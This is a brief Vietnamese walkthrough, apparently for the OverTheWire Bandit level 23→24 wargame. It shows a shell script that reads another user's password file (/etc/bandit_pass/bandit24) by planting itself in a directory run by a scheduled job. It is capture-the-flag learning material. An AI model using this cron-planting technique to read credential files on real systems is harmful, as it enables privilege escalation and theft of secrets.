Đề bài yêu cầu tạo 1 shell script riêng
Vào /tmp tạo file script.sh với nội dung
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password.txt
Sau đó cấp quyền exec cho file .sh và cp nó vào /var
Chờ 1 lúc rồi cat password.txt để lấy pass